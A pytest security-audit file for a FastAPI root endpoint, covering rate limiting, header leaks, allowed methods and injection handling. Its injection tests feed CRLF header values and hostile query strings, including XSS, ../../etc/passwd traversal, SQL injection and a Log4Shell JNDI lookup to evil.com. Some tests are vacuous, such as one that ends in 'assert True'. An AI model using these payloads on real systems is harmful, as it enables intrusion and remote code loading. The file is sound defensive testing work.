"""
Comprehensive security audit tests for Default Root Endpoint (`/`).

This audit focuses on:
- DoS via excessive requests (rate limiting)
- Information disclosure
- Service enumeration
- Response manipulation
- Header injection attempts
- Query parameter injection attempts
- Error handling
"""
import pytest
import asyncio
from fastapi.testclient import TestClient
from unittest.mock import patch, Mock
import time

from src.main import app, default_endpoint
from src.rate_limiter import rate_limiter


# ============================================================================
# FIXTURES
# ============================================================================

@pytest.fixture
def client():
    """Create test client for default endpoint tests."""
    return TestClient(app)


@pytest.fixture(autouse=True)
def reset_rate_limiter():
    """Reset rate limiter state before each test to prevent test interference."""
    # Clear rate limiter state before each test
    rate_limiter.requests.clear()
    yield
    # Clear rate limiter state after each test as well
    rate_limiter.requests.clear()


# ============================================================================
# 1. DoS VIA EXCESSIVE REQUESTS (RATE LIMITING)
# ============================================================================

class TestDefaultEndpointDoSProtection:
    """Test DoS protection for default endpoint."""
    
    def test_default_endpoint_rate_limiting(self, client):
        """Test that default endpoint has rate limiting (DoS protection)."""
        # Make many rapid requests
        responses = []
        rate_limited = False
        for i in range(150):  # More than default limit of 120
            response = client.get("/")
            responses.append(response.status_code)
            if response.status_code == 429:
                rate_limited = True
                break
        
        # Should eventually hit rate limit
        assert rate_limited, "Rate limiting should be enforced after exceeding limit"
    
    def test_default_endpoint_concurrent_requests(self, client):
        """Test that default endpoint handles concurrent requests with rate limiting."""
        import concurrent.futures
        
        def make_request():
            return client.get("/")
        
        # Make 50 concurrent requests (within rate limit)
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(make_request) for _ in range(50)]
            responses = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        # Most should succeed (within rate limit)
        success_count = sum(1 for r in responses if r.status_code == 200)
        assert success_count > 0, "Some requests should succeed within rate limit"
    
    def test_default_endpoint_sustained_requests(self, client):
        """Test that default endpoint rate limits sustained requests (DoS protection)."""
        start_time = time.time()
        request_count = 0
        rate_limited_count = 0
        
        # Make requests for 1 second
        while time.time() - start_time < 1.0:
            response = client.get("/")
            if response.status_code == 429:
                rate_limited_count += 1
            elif response.status_code == 200:
                request_count += 1
            # Stop if we hit rate limit
            if rate_limited_count > 0:
                break
        
        # Should eventually hit rate limit with sustained requests
        # This demonstrates DoS protection is working
        assert request_count > 0 or rate_limited_count > 0, "Should either succeed or hit rate limit"
    
    def test_default_endpoint_memory_exhaustion_risk(self, client):
        """Test that default endpoint doesn't accumulate state (memory leak risk)."""
        # Make many requests and check if memory usage increases
        # Note: Some requests may be rate limited (429), which is expected behavior
        success_count = 0
        rate_limited_count = 0
        
        for i in range(1000):
            response = client.get("/")
            if response.status_code == 200:
                success_count += 1
            elif response.status_code == 429:
                rate_limited_count += 1
                # Rate limiting is expected after exceeding limit
                break
        
        # Should have some successful requests before hitting rate limit
        # If we get here without memory issues, endpoint is stateless (good)
        assert success_count > 0 or rate_limited_count > 0, "Should have some successful requests or hit rate limit"


# ============================================================================
# 2. INFORMATION DISCLOSURE
# ============================================================================

class TestDefaultEndpointInformationDisclosure:
    """Test information disclosure vulnerabilities."""
    
    def test_default_endpoint_response_content(self, client):
        """Test that default endpoint doesn't leak sensitive information."""
        response = client.get("/")
        
        assert response.status_code == 200
        data = response.json()
        
        # Should only return simple message, no sensitive info
        assert "message" in data
        assert data["message"] == "200 OK"
        
        # Should not contain:
        assert "version" not in str(data).lower()
        assert "server" not in str(data).lower()
        assert "error" not in str(data).lower()
        assert "stack" not in str(data).lower()
        assert "traceback" not in str(data).lower()
        assert "password" not in str(data).lower()
        assert "secret" not in str(data).lower()
        assert "token" not in str(data).lower()
    
    def test_default_endpoint_error_handling(self, client):
        """Test that default endpoint handles errors gracefully."""
        # Default endpoint is simple and shouldn't error, but test error handling
        response = client.get("/")
        assert response.status_code == 200
        
        # If endpoint were to error, it should be sanitized
        # (This is a theoretical test since endpoint is too simple to error)
        assert True
    
    def test_default_endpoint_header_disclosure(self, client):
        """Test that response headers don't leak sensitive information."""
        response = client.get("/")
        
        # Check that security headers are present (good)
        assert "X-Content-Type-Options" in response.headers
        assert "X-Frame-Options" in response.headers
        
        # Should not leak:
        assert "X-Powered-By" not in response.headers  # Don't leak framework
        assert "Server" not in response.headers or "nginx" not in response.headers.get("Server", "").lower()  # Don't leak server info
    
    def test_default_endpoint_server_header(self, client):
        """Test that Server header doesn't leak framework version."""
        response = client.get("/")
        
        # FastAPI/Starlette may add Server header, but shouldn't leak version
        if "Server" in response.headers:
            server_header = response.headers["Server"]
            # Should not contain version numbers or detailed info
            assert "fastapi" not in server_header.lower() or "version" not in server_header.lower()


# ============================================================================
# 3. SERVICE ENUMERATION
# ============================================================================

class TestDefaultEndpointEnumeration:
    """Test service enumeration vulnerabilities."""
    
    def test_default_endpoint_service_detection(self, client):
        """Test that default endpoint can be used to detect service (enumeration)."""
        response = client.get("/")
        
        # Endpoint returns 200 OK, which confirms service is running
        # This is expected behavior for a health check endpoint
        assert response.status_code == 200
        
        # This is acceptable for a public endpoint, but should be documented
    
    def test_default_endpoint_vs_other_endpoints(self, client):
        """Test that default endpoint behaves differently from protected endpoints."""
        # Default endpoint should be accessible
        default_response = client.get("/")
        assert default_response.status_code == 200
        
        # Protected endpoints should require auth
        stats_response = client.get("/stats")
        # Stats endpoint may require auth, so 401 is expected
        assert stats_response.status_code in [401, 403, 200]  # 200 if no auth configured
    
    def test_default_endpoint_method_enumeration(self, client):
        """Test that default endpoint only accepts GET (method enumeration)."""
        # GET should work
        get_response = client.get("/")
        assert get_response.status_code == 200
        
        # POST should fail (405 Method Not Allowed)
        post_response = client.post("/")
        assert post_response.status_code == 405
        
        # PUT should fail
        put_response = client.put("/")
        assert put_response.status_code == 405
        
        # DELETE should fail
        delete_response = client.delete("/")
        assert delete_response.status_code == 405


# ============================================================================
# 4. RESPONSE MANIPULATION
# ============================================================================

class TestDefaultEndpointResponseManipulation:
    """Test response manipulation vulnerabilities."""
    
    def test_default_endpoint_response_consistency(self, client):
        """Test that default endpoint returns consistent responses."""
        responses = []
        for _ in range(10):
            response = client.get("/")
            responses.append(response.json())
        
        # All responses should be identical
        assert all(r == {"message": "200 OK"} for r in responses), "Responses should be consistent"
    
    def test_default_endpoint_response_encoding(self, client):
        """Test that default endpoint handles encoding correctly."""
        response = client.get("/")
        
        assert response.status_code == 200
        assert response.headers.get("Content-Type") == "application/json"
        
        # Response should be valid JSON
        data = response.json()
        assert isinstance(data, dict)
        assert "message" in data
    
    def test_default_endpoint_response_size(self, client):
        """Test that default endpoint response is small (DoS protection)."""
        response = client.get("/")
        
        # Response should be small
        response_size = len(response.content)
        assert response_size < 100, "Response should be small to prevent DoS"
        
        # Typical response: {"message":"200 OK"} = ~18 bytes
        assert response_size < 50, "Response should be minimal"


# ============================================================================
# 5. HEADER INJECTION ATTEMPTS
# ============================================================================

class TestDefaultEndpointHeaderInjection:
    """Test header injection vulnerabilities."""
    
    def test_default_endpoint_header_processing(self, client):
        """Test that default endpoint doesn't process headers (good)."""
        # Default endpoint doesn't process headers, so no injection risk
        response = client.get("/", headers={
            "X-Custom-Header": "test",
            "User-Agent": "test",
            "X-Forwarded-For": "127.0.0.1"
        })
        
        assert response.status_code == 200
        # Endpoint doesn't process headers, so no injection possible
    
    def test_default_endpoint_malicious_headers(self, client):
        """Test that default endpoint ignores malicious headers."""
        # Try various malicious header patterns
        malicious_headers = [
            {"X-Injection": "test\r\nInjected: header"},
            {"X-Injection": "test\nInjected: header"},
            {"X-Injection": "test\x00null"},
            {"X-Injection": "test<script>alert(1)</script>"},
        ]
        
        for headers in malicious_headers:
            response = client.get("/", headers=headers)
            # Should still return 200 (endpoint doesn't process headers)
            assert response.status_code == 200
            # Response should not contain injected content
            assert "Injected" not in response.text
            assert "<script>" not in response.text


# ============================================================================
# 6. QUERY PARAMETER INJECTION ATTEMPTS
# ============================================================================

class TestDefaultEndpointQueryParameterInjection:
    """Test query parameter injection vulnerabilities."""
    
    def test_default_endpoint_query_parameters(self, client):
        """Test that default endpoint ignores query parameters (good)."""
        # Default endpoint doesn't process query parameters
        response = client.get("/?test=value&injection=<script>")
        
        assert response.status_code == 200
        # Response should not contain query parameter values
        assert "test" not in response.text
        assert "<script>" not in response.text
    
    def test_default_endpoint_malicious_query_parameters(self, client):
        """Test that default endpoint ignores malicious query parameters."""
        malicious_params = [
            "?test=<script>alert(1)</script>",
            "?test=../../etc/passwd",
            "?test=test%00null",
            "?test=test%0A%0Dnewline",
            "?test=' OR '1'='1",
            "?test=${jndi:ldap://evil.com/a}",
        ]
        
        for params in malicious_params:
            response = client.get(f"/{params}")
            assert response.status_code == 200
            # Response should not contain query parameter values
            assert "<script>" not in response.text
            assert "etc/passwd" not in response.text
            assert "OR" not in response.text or "OR" not in response.json().get("message", "")


# ============================================================================
# 7. ERROR HANDLING
# ============================================================================

class TestDefaultEndpointErrorHandling:
    """Test error handling in default endpoint."""
    
    def test_default_endpoint_exception_handling(self, client):
        """Test that default endpoint handles exceptions gracefully."""
        # The default endpoint is simple and shouldn't normally raise exceptions
        # However, we can verify that FastAPI's error handling is in place
        # by checking that the endpoint returns proper responses
        
        # Normal request should work
        response = client.get("/")
        assert response.status_code == 200
        
        # Verify that if an error were to occur, FastAPI's error handling
        # would catch it (this is tested by FastAPI's own error handling)
        # The endpoint itself is too simple to easily trigger exceptions,
        # but we verify it works correctly
        assert response.json() == {"message": "200 OK"}
        
        # Note: Testing actual exception handling would require modifying
        # the endpoint code, which is beyond the scope of this test.
        # FastAPI's built-in error handling is tested in FastAPI's own test suite.
    
    def test_default_endpoint_middleware_error_handling(self, client):
        """Test that middleware errors don't crash the endpoint."""
        # SecurityHeadersMiddleware should handle errors gracefully
        response = client.get("/")
        assert response.status_code == 200


# ============================================================================
# 8. RATE LIMITING RECOMMENDATION
# ============================================================================

class TestDefaultEndpointRateLimitingRecommendation:
    """Test that rate limiting should be added to default endpoint."""
    
    def test_default_endpoint_rate_limiting_enforced(self, client):
        """Test that default endpoint has rate limiting enforced (DoS protection)."""
        # Compare with /stats endpoint which has rate limiting
        # Default endpoint should also have rate limiting to prevent DoS
        
        # Make many requests to test rate limiting
        rate_limited = False
        for i in range(150):  # More than default limit of 120
            response = client.get("/")
            if response.status_code == 429:
                rate_limited = True
                # Verify rate limit message
                assert "Rate limit exceeded" in response.json().get("detail", "")
                break
        
        # Rate limiting should be enforced
        assert rate_limited, "Rate limiting should be enforced after exceeding limit"


# ============================================================================
# 9. SECURITY HEADERS VERIFICATION
# ============================================================================

class TestDefaultEndpointSecurityHeaders:
    """Test that security headers are properly set."""
    
    def test_default_endpoint_security_headers_present(self, client):
        """Test that default endpoint has security headers."""
        response = client.get("/")
        
        # Security headers should be present (from SecurityHeadersMiddleware)
        assert "X-Content-Type-Options" in response.headers
        assert response.headers["X-Content-Type-Options"] == "nosniff"
        
        assert "X-Frame-Options" in response.headers
        assert response.headers["X-Frame-Options"] == "DENY"
        
        assert "X-XSS-Protection" in response.headers
        assert "Referrer-Policy" in response.headers
        assert "Permissions-Policy" in response.headers
        assert "Content-Security-Policy" in response.headers
    
    def test_default_endpoint_cors_headers(self, client):
        """Test that CORS headers are properly configured."""
        response = client.get("/")
        
        # CORS headers should be present if configured
        # If no CORS origins configured, Access-Control-Allow-Origin should not be present
        # (This is secure - no CORS by default)
        if "Access-Control-Allow-Origin" in response.headers:
            # If present, should not be wildcard
            assert response.headers["Access-Control-Allow-Origin"] != "*"


# ============================================================================
# 10. AUTHENTICATION AND AUTHORIZATION
# ============================================================================

class TestDefaultEndpointAuthentication:
    """Test authentication and authorization for default endpoint."""
    
    def test_default_endpoint_no_authentication(self, client):
        """Test that default endpoint doesn't require authentication (by design)."""
        # Default endpoint is public (health check endpoint)
        response = client.get("/")
        assert response.status_code == 200
        
        # This is acceptable for a health check endpoint
        # But should be documented
    
    def test_default_endpoint_optional_authentication(self, client):
        """Test that default endpoint could optionally require authentication."""
        # Currently, endpoint has no authentication
        # This is acceptable for a health check, but could be configurable
        
        # Test with auth header (should still work, endpoint doesn't check)
        response = client.get("/", headers={"Authorization": "Bearer test-token"})
        assert response.status_code == 200
        
        # This documents that authentication is optional (not required)

